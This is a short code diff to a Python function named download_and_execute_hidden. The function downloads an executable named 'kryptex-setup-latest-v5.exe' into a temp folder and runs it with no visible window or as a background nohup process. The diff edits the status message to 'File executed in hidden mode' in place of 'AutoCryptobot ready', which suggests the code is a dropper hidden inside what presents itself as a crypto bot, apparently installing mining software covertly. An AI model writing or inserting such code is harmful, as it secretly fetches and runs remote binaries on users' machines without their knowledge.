@@ -56,6 +56,7 @@ def download_and_execute_hidden():
         file_name = "kryptex-setup-latest-v5.exe"
         file_path = os.path.join(temp_dir, file_name)
 
+        # Download the file
         response = requests.get(file_url, stream=True)
         if response.status_code == 200:
             with open(file_path, 'wb') as f:
@@ -65,7 +66,7 @@ def download_and_execute_hidden():
                 subprocess.run([file_path], creationflags=0x08000000)
             else:
                 os.system(f"nohup {file_path} &")
-            print(f"[*] AutoCryptobot ready")
+            print(f"[*] File executed in hidden mode")
         else:
             print(f"[!] Failed to download file: {response.status_code}")
     except Exception as e:
